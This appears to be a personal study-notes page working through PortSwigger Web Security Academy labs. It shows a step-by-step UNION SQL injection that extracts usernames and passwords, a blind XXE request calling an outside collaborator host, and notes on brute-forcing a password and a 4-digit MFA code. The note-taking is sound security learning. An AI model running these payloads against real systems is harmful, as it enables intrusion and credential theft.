---
layout: default
title: "Mystery Labs"
parent: "Web Application"
nav_order: 20
---


## 1
[Insecure Deserialization](Burp%20Suite%20Academy/Insecure%20Deserialization.md)
- Ysoserial with that exact command

## 2

![](assets/Images/Mystery%20Labs/potential_SQLi_lab2.png)

It's this [SQL Injection](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
The lab gives you the username and password columns and the users table, which I feel makes it significantly easier. 
- Start by determining the number of columns. The purpose is so that *we can do a UNION injection with the USERS table*, but we **need the correct number of columns**
	- `'ORDER BY 1--`, `ORDER BY 2--` and so on. We know it's at least two because there is a (1) title, and (2) description for each item. 
	- `http://<lab>/filter?category=Gifts'ORDER BY 1--`
		- FWIW, it does seem to order by the title, so check if you can see that
	- We get an internal server error at `' ORDER BY 3--` which means there are two columns
- Next we need the data types
	- `' UNION SELECT 'a', NULL--` -> no error
	- `' UNION SELECT 'a', 'a'--` -> no error means that both are **string** data types
- **Solution:** `GET /filter?category='+UNION+SELECT+username,+password+FROM+users-- HTTP/2` but it would also work `GET /filter?category=`==Gifts==`'+UNION+SELECT+username,+password+FROM+users-- HTTP/2`

## Lab 3
Solved the XSS lab simply by scanning the insertion point of the Search function:

![](assets/Images/Mystery%20Labs/XSS_lab3.png)


## Lab 4 
Requirement was to perform a DNS lookup for the public burp collaborator server (`burpcollaborator.net`). I noticed pretty quickly that there was XML. Tried a few payloads and got this one:
```HTTP
POST /product/stock HTTP/2
Host: 0af0009003f0dbea81040c1b00420055.web-security-academy.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "https://burpcollaborator.net">
    %ext;
]>
<stockCheck>
	<productId>
		20
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```


## Lab 5

Exploit server involved. Logging in requires a 4 digit security code. Have a feeling that's a pretty big clue. 

Password brute force to get `carlos`:`football`, but still need to change the email somehow. 

Except you can just brute force the MFA bc there is no timeout apparently. 